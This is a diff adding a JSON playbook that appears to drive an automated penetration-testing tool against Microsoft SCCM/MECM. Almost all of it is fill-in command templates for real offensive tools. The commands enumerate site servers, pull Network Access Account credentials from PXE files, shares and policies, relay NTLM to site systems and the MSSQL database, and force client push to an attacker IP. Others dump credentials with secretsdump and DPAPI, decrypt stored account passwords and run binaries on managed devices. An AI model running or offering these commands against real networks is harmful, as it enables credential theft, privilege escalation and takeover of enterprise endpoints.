@@ -1,0 +1,329 @@
+{
+  "service": "sccm",
+  "description": "Microsoft System Center Configuration Manager (SCCM/MECM) exploitation and credential extraction",
+  "ports": [80, 443, 445, 1433],
+  "serviceNames": ["http", "https", "smb", "mssql"],
+  "targetOs": ["windows"],
+  "vectors": [
+    {
+      "id": "sccm-enumeration",
+      "name": "SCCM Infrastructure Enumeration",
+      "phase": "reconnaissance",
+      "prerequisites": ["valid_credentials"],
+      "description": "Enumerate SCCM infrastructure including site servers, management points, and distribution points",
+      "commands": [
+        {
+          "tool": "sccmhunter.py",
+          "command": "sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug",
+          "description": "Discover SCCM infrastructure"
+        },
+        {
+          "tool": "sccmhunter.py",
+          "command": "sccmhunter.py show -all",
+          "description": "Display all discovered SCCM components"
+        },
+        {
+          "tool": "ldeep",
+          "command": "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm",
+          "description": "Query SCCM objects via LDAP"
+        },
+        {
+          "tool": "SharpSCCM.exe",
+          "command": "SharpSCCM.exe local site-info",
+          "description": "Get local SCCM site information"
+        }
+      ],
+      "outcomes": ["information_gathered"]
+    },
+    {
+      "id": "sccm-pxe-credentials",
+      "name": "Extract Credentials from PXE Boot",
+      "phase": "credential_access",
+      "prerequisites": ["network_access"],
+      "description": "Extract Network Access Account (NAA) credentials from unprotected PXE boot files",
+      "commands": [
+        {
+          "tool": "pxethief.py",
+          "command": "pxethief.py 1",
+          "description": "Extract unprotected PXE credentials"
+        },
+        {
+          "tool": "pxethief.py",
+          "command": "pxethief.py 2 <distribution_point_ip>",
+          "description": "Extract from specific distribution point"
+        },
+        {
+          "tool": "pxethief.py",
+          "command": "tftp -i <dp_ip> GET \"\\xxx\\boot.var\" && pxethief.py 5 '\\xxx\\boot.var'",
+          "description": "Extract password-protected PXE credentials"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "sccm-relay-site-systems",
+      "name": "NTLM Relay to SCCM Site Systems",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Coerce SCCM site server authentication and relay to gain admin access on site systems",
+      "commands": [
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -tf <site_systems> -smb2support",
+          "description": "Setup relay to site systems"
+        }
+      ],
+      "outcomes": ["admin_access", "privilege_escalation"]
+    },
+    {
+      "id": "sccm-client-push-force",
+      "name": "Force SCCM Client Push Installation",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Force SCCM to perform client push installation to attacker-controlled system for NTLM relay",
+      "commands": [
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -t <sccm_server> -smb2support -socks",
+          "description": "Setup relay listener"
+        },
+        {
+          "tool": "SharpSCCM.exe",
+          "command": "SharpSCCM.exe invoke client-push -mp <sccm_server>.<domain> -sc <site_code> -t <attacker_ip>",
+          "description": "Trigger client push to attacker"
+        },
+        {
+          "tool": "proxychains",
+          "command": "proxychains smbexec.py -no-pass <domain>/<socks_user>@<sccm_server>",
+          "description": "Execute commands via relayed session"
+        }
+      ],
+      "outcomes": ["admin_access", "privilege_escalation"]
+    },
+    {
+      "id": "sccm-automatic-client-push",
+      "name": "Abuse Automatic Client Push",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Create fake computer object to trigger automatic client push and relay authentication",
+      "commands": [
+        {
+          "tool": "dnstool.py",
+          "command": "dnstool.py -u '<domain>\\<user>' -p <pass> -r <newcomputer>.<domain> -a add -t A -d <attacker_ip> <dc_ip>",
+          "description": "Create DNS A record for fake computer"
+        },
+        {
+          "tool": "setspn",
+          "command": "setspn -D host/<newcomputer> <newcomputer>",
+          "description": "Remove host SPN from machine account"
+        },
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -tf <no_signing_target> -smb2support -socks",
+          "description": "Relay automatic client push authentication"
+        }
+      ],
+      "outcomes": ["privilege_escalation"]
+    },
+    {
+      "id": "sccm-loot-smb-shares",
+      "name": "Loot Credentials from SCCM Shares",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "Extract credentials and sensitive data from SCCM distribution point file shares",
+      "commands": [
+        {
+          "tool": "cmloot.py",
+          "command": "cmloot.py <domain>/<user>:<password>@<sccm_dp> -cmlootinventory sccmfiles.txt",
+          "description": "Loot credentials from SMB shares"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "sccm-loot-http-policies",
+      "name": "Extract Credentials from SCCM HTTP Policies",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "Request and decrypt SCCM policies containing credentials via HTTP",
+      "commands": [
+        {
+          "tool": "SCCMSecrets.py",
+          "command": "SCCMSecrets.py policies -mp http://<management_point> -u '<machine_account>$' -p '<machine_password>' -cn '<client_name>'",
+          "description": "Request and decrypt SCCM policies"
+        },
+        {
+          "tool": "SCCMSecrets.py",
+          "command": "SCCMSecrets.py files -dp http://<distribution_point> -u '<user>' -p '<password>'",
+          "description": "Download and extract credentials from files"
+        },
+        {
+          "tool": "sccm-http-looter",
+          "command": "sccm-http-looter -server <ip_dp>",
+          "description": "Automated HTTP credential extraction"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "sccm-relay-mssql-admin",
+      "name": "Relay to SCCM MSSQL Database for Admin",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Relay SCCM server authentication to MSSQL database to gain SCCM admin privileges",
+      "commands": [
+        {
+          "tool": "sccmhunter.py",
+          "command": "sccmhunter.py mssql -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug -tu <target_user> -sc <site_code> -stacked",
+          "description": "Prepare MSSQL stacked query"
+        },
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -smb2support -ts -t mssql://<sccm_mssql> -q \"<query>\"",
+          "description": "Relay to MSSQL and execute query"
+        },
+        {
+          "tool": "sccmhunter.py",
+          "command": "sccmhunter.py admin -u <target_user>@<domain> -p '<password>' -ip <sccm_ip>",
+          "description": "Use elevated SCCM admin access"
+        }
+      ],
+      "outcomes": ["admin_access", "privilege_escalation"]
+    },
+    {
+      "id": "sccm-relay-mssql-server",
+      "name": "Relay to SCCM MSSQL Server",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Relay SCCM server to MSSQL server for direct database access",
+      "commands": [
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -t <sccm_mssql> -smb2support -socks",
+          "description": "Relay SCCM server to MSSQL"
+        },
+        {
+          "tool": "proxychains",
+          "command": "proxychains smbexec.py -no-pass <domain>/'<sccm_server>$'@<sccm_ip>",
+          "description": "Execute as SCCM server account"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    },
+    {
+      "id": "sccm-policy-request-naa",
+      "name": "Request SCCM Policies for NAA Credentials",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "Add fake computer and request SCCM policies to extract Network Access Account credentials",
+      "commands": [
+        {
+          "tool": "sccmwtf.py",
+          "command": "sccmwtf.py newcomputer newcomputer.<domain> <target> '<domain>\\<computer_added>$' '<computer_pass>'",
+          "description": "Add computer and request policy"
+        },
+        {
+          "tool": "policysecretunobfuscate.py",
+          "command": "policysecretunobfuscate.py",
+          "description": "Deobfuscate NAA credentials"
+        },
+        {
+          "tool": "SharpSCCM.exe",
+          "command": "SharpSCCM.exe get secrets -r newcomputer -u <computer_added>$ -p <computer_pass>",
+          "description": "Extract secrets from policy"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "sccm-dpapi-local-secrets",
+      "name": "Extract SCCM Secrets via DPAPI",
+      "phase": "credential_access",
+      "prerequisites": ["admin_access"],
+      "description": "Extract NAA and other SCCM credentials using DPAPI with local admin access",
+      "commands": [
+        {
+          "tool": "dploot.py",
+          "command": "dploot.py sccm -u <admin> -p '<password>' <sccm_target>",
+          "description": "Extract SCCM secrets via DPAPI"
+        },
+        {
+          "tool": "sccmhunter.py",
+          "command": "sccmhunter.py dpapi -u <admin> -p '<password>' -target <sccm_target> -debug",
+          "description": "Extract credentials from SCCM client"
+        },
+        {
+          "tool": "SharpSCCM.exe",
+          "command": "SharpSCCM.exe local secrets -m disk",
+          "description": "Extract secrets from disk"
+        },
+        {
+          "tool": "SharpSCCM.exe",
+          "command": "SharpSCCM.exe local secrets -m wmi",
+          "description": "Extract secrets from WMI"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "sccm-site-db-credentials",
+      "name": "Extract Site Database Credentials",
+      "phase": "credential_access",
+      "prerequisites": ["admin_access"],
+      "description": "Dump SCCM site database credentials from SCCM server as admin",
+      "commands": [
+        {
+          "tool": "secretsdump.py",
+          "command": "secretsdump.py <domain>/<admin>:'<pass>'@<sccm_target>",
+          "description": "Extract SCCM server credentials"
+        },
+        {
+          "tool": "mssqlclient.py",
+          "command": "mssqlclient.py -windows-auth -hashes '<sccm_target_hashNT>' '<domain>/<sccm_target>$'@<sccm_mssql>",
+          "description": "Connect to SCCM database"
+        },
+        {
+          "tool": "sccmdecryptpoc.exe",
+          "command": "use CM_<site_code>; SELECT * FROM SC_UserAccount; sccmdecryptpoc.exe <cyphered_value>",
+          "description": "Query and decrypt user account passwords"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "sccm-remote-execution",
+      "name": "Remote Code Execution as SCCM Admin",
+      "phase": "lateral_movement",
+      "prerequisites": ["sccm_admin"],
+      "description": "Execute commands on SCCM managed devices using admin privileges",
+      "commands": [
+        {
+          "tool": "SharpSCCM.exe",
+          "command": "SharpSCCM.exe exec -p <binary> -d <device_name> -sms <SMS_PROVIDER> -sc <SITECODE> --no-banner",
+          "description": "Execute binary on target device"
+        },
+        {
+          "tool": "sccmhunter.py",
+          "command": "sccmhunter.py admin -u <user>@<domain> -p '<password>' -ip <sccm_ip>",
+          "description": "Interactive SCCM admin session"
+        }
+      ],
+      "outcomes": ["lateral_movement", "admin_access"]
+    },
+    {
+      "id": "sccm-bloodhound-sessions",
+      "name": "Enumerate User Sessions via SCCM",
+      "phase": "reconnaissance",
+      "prerequisites": ["sccm_admin"],
+      "description": "Use SCCM admin access to enumerate user sessions across managed devices",
+      "commands": [
+        {
+          "tool": "SCCMHound.exe",
+          "command": "SCCMHound.exe --server <server> --sitecode <sitecode>",
+          "description": "Collect user session data for BloodHound"
+        }
+      ],
+      "outcomes": ["information_gathered"]
+    }
+  ]
+}
